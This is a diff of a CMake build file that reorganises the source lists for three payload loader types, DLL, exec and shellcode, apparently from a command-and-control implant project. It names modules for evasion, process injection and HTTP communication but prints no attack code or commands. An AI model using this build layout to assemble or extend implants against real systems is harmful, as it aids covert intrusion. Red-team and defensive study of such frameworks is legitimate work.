@@ -35,32 +35,41 @@ add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
 if(${PAYLOAD_TYPE} STREQUAL \"dll-loader\")
     set(SOURCE
             src/main/dll_loader_${PAYLOAD_FORMAT}.cpp
-            src/core/hermit.cpp
-            src/core/common.cpp
-            src/core/convert.cpp
-            src/core/inject.cpp
-            src/core/winhttp.cpp
-            src/core/winsystem.cpp
+            src/hermit.cpp
+            src/core/evasion/injection.cpp
+            src/core/handler.cpp
+            src/core/stdout.cpp
+            src/core/system/arch.cpp
+            src/core/system/env.cpp
+            src/core/system/http.cpp
+            src/core/system/process.cpp
+            src/core/utils/convert.cpp
         )
 elseif(${PAYLOAD_TYPE} STREQUAL \"exec-loader\")
     set(SOURCE
         src/main/exec_loader_${PAYLOAD_FORMAT}.cpp
-        src/core/hermit.cpp
-        src/core/common.cpp
-        src/core/convert.cpp
-        src/core/inject.cpp
-        src/core/winhttp.cpp
-        src/core/winsystem.cpp
+        src/hermit.cpp
+        src/core/evasion/injection.cpp
+        src/core/handler.cpp
+        src/core/stdout.cpp
+        src/core/system/arch.cpp
+        src/core/system/env.cpp
+        src/core/system/http.cpp
+        src/core/system/process.cpp
+        src/core/utils/convert.cpp
     )
 elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode-loader\")
     set(SOURCE
         src/main/shellcode_loader_${PAYLOAD_FORMAT}.cpp
-        src/core/hermit.cpp
-        src/core/common.cpp
-        src/core/convert.cpp
-        src/core/inject.cpp
-        src/core/winhttp.cpp
-        src/core/winsystem.cpp
+        src/hermit.cpp
+        src/core/evasion/injection.cpp
+        src/core/handler.cpp
+        src/core/stdout.cpp
+        src/core/system/arch.cpp
+        src/core/system/env.cpp
+        src/core/system/http.cpp
+        src/core/system/process.cpp
+        src/core/utils/convert.cpp
     )
 endif()
 
